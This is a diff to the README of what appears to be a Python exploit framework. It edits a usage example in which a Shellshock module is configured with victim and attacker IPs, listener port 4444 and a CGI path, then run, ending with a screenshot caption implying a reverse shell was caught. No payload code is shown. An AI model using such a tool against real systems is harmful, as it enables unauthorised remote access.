@@ -24,7 +24,16 @@ exploit (shellshock)> exploit set victim_port 80
 exploit (shellshock)> exploit set attacker_ip 192.168.56.102
 exploit (shellshock)> exploit set attacker_port 4444
 exploit (shellshock)> exploit set cgi_path /cgi-bin/status
-exploit (shellshock)> exploit set payload [Not configured as of now]
+exploit (shellshock)> exploit set payload None
+exploit (shellshock)> exploit options
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+victim_ip               |		192.168.56.101
+victim_port             |		80
+attacker_ip             |		192.168.56.102
+attacker_port           |		4444
+cgi_path                |		/cgi-bin/status
+payload                 |		None
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 exploit (shellshock)> exploit run
 [*]	Checking for vulnerability
 	[*]	Injecting with test nonce 13b64e57dbff4e63b412d40f02ecc933
@@ -40,6 +49,8 @@ exploit (shellshock)>
 And on our listening machine...
 
 ![We have a catch](https://github.com/spencerdodd/pysploit/blob/master/imgs/example-catch.png "catch img")
+
+As easy as that!
 
 ### =-=-=-= To Do =-=-=-=
 
